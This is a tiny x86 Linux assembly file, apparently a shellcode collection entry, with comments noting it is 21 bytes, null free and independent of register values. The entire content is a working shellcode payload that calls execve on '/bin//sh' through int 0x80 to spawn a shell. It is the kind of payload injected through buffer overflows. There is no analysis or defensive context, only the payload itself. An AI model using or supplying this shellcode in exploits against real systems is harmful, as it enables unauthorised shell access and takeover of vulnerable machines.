BITS 32

; 21 bytes
; null free
; assumes no particular register values
; does not set up argv!

xor ecx, ecx
push ecx
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
imul ecx
add al, 0xb
int 0x80
